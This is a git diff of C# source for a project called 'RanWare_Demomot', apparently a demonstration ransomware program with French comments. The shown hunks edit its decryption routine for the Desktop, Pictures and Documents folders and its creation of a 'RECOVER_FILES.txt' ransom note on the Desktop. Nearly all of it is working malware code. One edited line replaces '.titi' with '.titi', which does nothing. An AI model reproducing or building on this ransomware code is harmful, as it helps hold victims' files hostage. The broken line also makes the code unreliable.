@@ -12,9 +12,9 @@ namespace RanWare_Demomot
         readonly CspParameters cspP = new CspParameters();
         RSACryptoServiceProvider rsa;
 
-        bool isDecripted;
+        bool isDecripted;//Bool pour savoir si l'utilsiateur a decrypter ses fichiers
         List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
-        int numberOfFiles;//Variables pour conter le nombre de fichiers encryptés
+        int numberOfFiles;//Variables pour compter le nombre de fichiers encryptés
 
         const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
         const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
@@ -207,13 +207,17 @@ namespace RanWare_Demomot
                 {
                     decryptFolderFiles(Pictures);
                 }
+                if (DECRYPT_DOCUMENTS)
+                {
+                    decryptFolderFiles(Documents);
+                }
+                isDecripted = true;
                 ransomLetter(filesName);
             }
             else
             {
                 MessageBox.Show("Bien essayé");
             }
-            
         }
 
         /// <summary>
@@ -233,8 +237,7 @@ namespace RanWare_Demomot
             byte[] LenIV = new byte[4];
 
             //Crée le fichier non encrypté
-            string outFile =
-                Path.ChangeExtension(file.FullName.Replace("Encrypt", "Decrypt"), "");
+            string outFile = Path.ChangeExtension(file.FullName.Replace(".titi", ".titi"), "");
 
             //Utilise FileStream pour lire le fichier encrypté
             // Use FileStream objects to read the encrypted
@@ -320,15 +323,13 @@ namespace RanWare_Demomot
         /// <param name="files"></param>
         private void ransomLetter(List<string> files)
         {
-            string path = Desktop + @"\RECOVER_FILES.TXT";
+            string path = Desktop + @"\RECOVER_FILES.txt";
             FileInfo fi = new FileInfo(path);
             if (fi.Exists)
             {
                 fi.Delete();
             }
             //StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
-
-            //FileInfo fi = new FileInfo(Desktop + @"\RECOVER_FILES.TXT");//Test
 
             using (FileStream fs = fi.Create())
             {
@@ -338,14 +339,11 @@ namespace RanWare_Demomot
                     fs.Write(info, 0, info.Length);
                 }
             }
-
-            //foreach (string fileName in files)
-            //{
-            //    fi.WriteLine(fileName);
-            //}
-            
-
-            //ransomWriter.Close();
+            //Delete le fichier de rançon si l'utilisateur a decrypté ses fichiers
+            if (isDecripted == true)
+            {
+                fi.Delete();
+            }
         }
     }
 }
